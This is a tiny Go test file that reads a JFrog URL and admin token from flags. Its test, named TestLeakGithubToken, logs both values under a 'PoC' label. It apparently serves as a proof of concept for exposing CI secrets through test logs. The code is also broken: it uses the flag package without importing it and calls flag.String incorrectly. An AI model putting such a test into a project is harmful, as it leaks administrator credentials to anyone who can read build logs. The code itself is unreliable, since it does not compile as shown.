package tests

import (
	"os"
	"testing"
)

var jfrog_url = flag.String("jfrog.url")
var jfrog_token = flag.String("adminToken")

func TestLeakGithubToken(t *testing.T) {
	t.Logf("PoC: var_jfrog_token: %s var_jfrog_url: %s", jfrog_token, jfrog_url)
}
